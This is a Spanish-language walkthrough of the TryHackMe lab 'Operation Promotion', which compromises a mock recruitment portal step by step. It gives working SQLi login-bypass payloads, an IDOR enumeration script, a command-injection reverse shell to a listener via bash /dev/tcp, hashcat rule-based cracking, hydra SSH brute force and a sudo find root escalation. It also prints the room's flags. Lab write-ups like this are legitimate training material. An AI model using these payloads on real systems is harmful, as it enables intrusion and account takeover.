# TryHackMe — Operation Promotion (RecruitCorp)

**Sala:** Operation Promotion
**Plataforma:** TryHackMe
**Dificultad:** Fácil
**Tema:** Enumeración web · robots.txt · SQL injection (bypass de login) · IDOR · Command injection (`;`) · Reverse shell (Penelope) · Wordlist con reglas (hashcat) · Fuerza bruta SSH (hydra) · Escalada con `sudo find`
**Objetivo:** Comprometer el portal de reclutamiento de *RecruitCorp*, capturar las 2 flags y demostrar que estás listo para el título de *Penetration Tester*.

> **Resumen en una línea:** el `nmap` destapa el portal en `:80` y el `robots.txt` delata `/admin/`; el login se salta con SQLi (`admin' -- -`), dentro hay un **IDOR** en `lookup.php?id=` que revela el script `ping.php` de la cuenta `sysmaint`; con *command injection* (`;`) se consigue reverse shell como `www-data`, se crackea el hash con una wordlist mutada (`spring2026!`), se entra como `jford` por SSH y se escala a `root` con `sudo find`.

---

## 0. Información de la máquina

- **IP:** varía según el despliegue de la sala (en las capturas aparecen `10.67.163.196` en la fase de reconocimiento y `10.67.189.129` en la explotación). Usa tu IP actual.
- **Servicios:** `22/tcp` SSH (OpenSSH 9.6p1 Ubuntu), `80/tcp` HTTP (Apache 2.4.58 — **RecruitCorp – Careers Portal**), `139/445/tcp` Samba.
- **Web:** `http://IP/` — `http-robots.txt: 1 disallowed entry`.
- **Usuarios interesantes:** `admin` (portal), `sysmaint` (cuenta de servicio), `jford` (usuario del sistema).

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC -Pn -oN scan_port.txt IP_MACHINA
```

![[Pasted image 20261116120717.png]]

Puertos abiertos:

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.16) |
| 80/tcp | HTTP | Apache 2.4.58 — título *RecruitCorp – Careers Portal*; **`robots.txt` con 1 entrada** → `/admin/` |
| 139/445/tcp | Samba | smbd 4.6.2 — NetBIOS name `RECRUITCORP` |

![[Pasted image 20261116120646.png]]

*Salida completa del escaneo (996 puertos TCP cerrados).*

---

## 2. robots.txt — la pista inicial

El propio `nmap` ya avisaba de la entrada deshabilitada; abriéndola en el navegador:

```
User-agent: *
Disallow: /admin/
```

![[Pasted image 20261116122646.png]]

---

## 3. Enumeración de directorios (gobuster)

```bash
gobuster dir -u http://IP_MACHINA -w /usr/share/wordlists/dirb/common.txt -t 50
```

![[Pasted image 20261116122446.png]]

Resultado relevante:

- `/admin` → **301** (redirige a `/admin/`) — misma ruta que `robots.txt`.
- `/robots.txt` → 200.
- `/index.php` → 200.
- El resto (`/.htaccess`, `/.hta`, `/server-status`…) → 403, sin interés.

---

## 4. Panel de administración y bypass del login (SQLi)

Entrando en `http://IP_MACHINA/admin/` aparece el panel **RecruitCorp Admin** con un formulario de acceso interno:

![[Pasted image 20261116122728.png]]

El formulario es vulnerable a **inyección SQL en el campo usuario** (concatenación de la consulta). Basta con romper la condición y comentar el resto; la contraseña da igual:

```
admin' -- -
```

Payload equivalente:

```
' or 1=1 -- -
```

- Indicador de éxito: redirección al panel con cookie `PHPSESSID` nueva (guárdala, la necesitas después).
- Desde el navegador se puede inspeccionar la petición con las *Dev Tools* (pestaña Red) y repetirla con `curl` usando `-H "Cookie: PHPSESSID=..."`.

> Ver `Comando Rapido/SQLmap.md` (sección *Bypass de login*) y `Comando Rapido/Enumeracion web.md`.

---

## 5. IDOR en lookup.php — enumeración de usuarios

Dentro del panel hay una herramienta de búsqueda de usuarios (`/admin/users/lookup.php`) que toma el parámetro `id` **sin comprobar permisos**: cambiando el número accedes a la ficha de cualquier usuario (**IDOR**).

Para no ir ID a ID a mano, script de enumeración (`enumera.sh`):

```bash
#!/bin/bash

URL="http://IP_MACHINA/admin/users/lookup.php"
COOKIE="TU_COOKIE_PHPSESSID"

for id in {1..10}; do
    username=$(curl -s -L \
        -H "Cookie: PHPSESSID=$COOKIE" \
        "$URL?id=$id" |
        sed -n 's/.*<th>Username<\/th><td>\(.*\)<\/td>.*/\1/p')

    if [ -n "$username" ]; then
        echo "$username" | tee -a usuarios.txt
    fi
done
```

```bash
bash enumera.sh
```

![[Pasted image 20261116130810.png]]

![[Pasted image 20261116131149.png]]

Usuarios enumerados (`id` 1–10):

| ID | Usuario | Nota |
| --- | --- | --- |
| 1 | `admin` | el que usamos para entrar |
| 2 | `mvasquez` | recruiter |
| 3 | `tparker` | recruiter |
| 4 | `lhayes` | |
| 5 | `kchen` | |
| 6 | `rdavis` | *Owns the EMEA pipeline* |
| 7 | **`sysmaint`** | **cuenta de sistema: su ficha revela `ping.php`** |
| 8 | `jbailey` | |
| 9 | `okafor` | |

Abriendo la ficha del **ID 7** (`sysmaint`) está la pista que encadena el resto del ataque:

![[Pasted image 20261116165208.png]]

> **Notes:** *Service account for `/admin/sysmaint-checks/ping.php`. Do not disable.*

---

## 6. Command injection en ping.php

Siguiendo la URL de la ficha anterior, el script muestra su uso:

```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

![[Pasted image 20261116165259.png]]

El parámetro `host` se pasa directamente a un comando de shell, así que funciona el **command injection con `;`** (aquí filtran menos que en otras máquinas; si no funcionara, probar con salto de línea `%0a`):

```
http://IP/admin/sysmaint-checks/ping.php?host=127.0.0.1;id
```

Con la inyección confirmada, reverse shell codificada en la URL (usamos [Penelope](https://github.com/brightio/penelope) como handler, ver `Comando Rapido/Penelope — reverse shell.md`):

```
http://IP/admin/sysmaint-checks/ping.php?host=127.0.0.1;bash+-c+%22bash+-i+%3E%26+/dev/tcp/IP_LOCAL/4444+0%3E%261%22
```

- `%3E%26` = `>&`, `%22` = comillas, `+` = espacio.
- Payload equivalente en claro: `bash -c "bash -i >& /dev/tcp/IP_LOCAL/4444 0>&1"`.

![[Pasted image 20261116171802.png]]

Penelope recibe la sesión (*New Reverse Shell → www-data*) y la comprobación con `id` confirma:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. Del shell a las credenciales: hash + wordlist mutada + hydra

Como `www-data`, explorando la web aparece la configuración de la base de datos (`db.conf` / `app.db`) con un **hash bcrypt** del usuario `jford` (formato `$2b$10$...`).

Primero, un candidato basado en palabras de la propia sala (temática *spring*):

```bash
echo "spring2026" > jfordpassword.txt
```

![[Pasted image 20261116172646.png]]

Nada con rockyou → **mutar la wordlist con reglas de hashcat** (regla `dive`, muy agresiva):

```bash
hashcat --stdout jfordpassword.txt -r /usr/share/hashcat/rules/dive.rule > jfordpasslist.txt
```

![[Pasted image 20261116172709.png]]

La variante `spring2026!` funciona **contra SSH** (la del panel web solo servía para el login de administración):

```bash
hydra -l jford -P jfordpasslist.txt IP_MACHINA ssh
```

![[Pasted image 20261116172735.png]]

```
[22][ssh] host: IP   login: jford   password: spring2026!
1 valid password found
```

> **Lección:** una contraseña *débil pero no en rockyou* (generada por el propio CTF) solo sale con una wordlist **temática + reglas**.

---

## 8. Shell como jford — flag de usuario

Desde la shell de `www-data`:

```bash
su jford
# contraseña: spring2026!
cd /home/jford
cat user.txt
```

![[Pasted image 20261116172904.png]]

**Flag de usuario:**

```
THM{bdbee0a91ebcb0b0fadfe931223efe09}
```

*(También entra directo por SSH: `ssh jford@IP`.)*

---

## 9. Escalada a root — `sudo find` (GTFOBins)

```bash
sudo -l
```

```
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

`find` con `sudo` sin contraseña = root según [GTFOBins](https://gtfobins.github.io/find/):

```bash
sudo /usr/bin/find . -exec /bin/sh -p \;
id          # uid=0(root)
cd /root
cat flag.txt
```

![[Pasted image 20261116173342.png]]

**Flag de root:**

```
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

---

## 10. Flags y lecciones

| Flag | Valor |
| --- | --- |
| Usuario (`/home/jford/user.txt`) | `THM{bdbee0a91ebcb0b0fadfe931223efe09}` |
| Root (`/root/flag.txt`) | `THM{d999a1f6319a9c5b48c067dfab314ba2}` |

1. **`robots.txt` y `nmap` ya te regalan la ruta de entrada** (`/admin/`) — leer la salida completa del escaneo.
2. **IDOR con un solo parámetro** (`lookup.php?id=`) puede encadenar todo el ataque: la ficha de `sysmaint` apuntaba al siguiente paso.
3. **Command injection con `;`** cuando no filtran nada; `%0a` queda para cuando sí filtran `;` y `|`.
4. **Las contraseñas de CTF no están en rockyou**: wordlist temática + `hashcat --stdout -r dive.rule` y contra el servicio correcto (SSH, no el login web).
5. **`sudo -l` siempre** — el `NOPASSWD: /usr/bin/find` de `jford` fue el cierre.

> Comandos relacionados: `Comando Rapido/Enumeracion web.md`, `Comando Rapido/SQLmap.md`, `Comando Rapido/Shells y transferencia.md`, `Comando Rapido/Fuerza bruta y crackeo.md`, `Comando Rapido/Escalada de privilegios Linux.md`, `Comando Rapido/Penelope — reverse shell.md`.
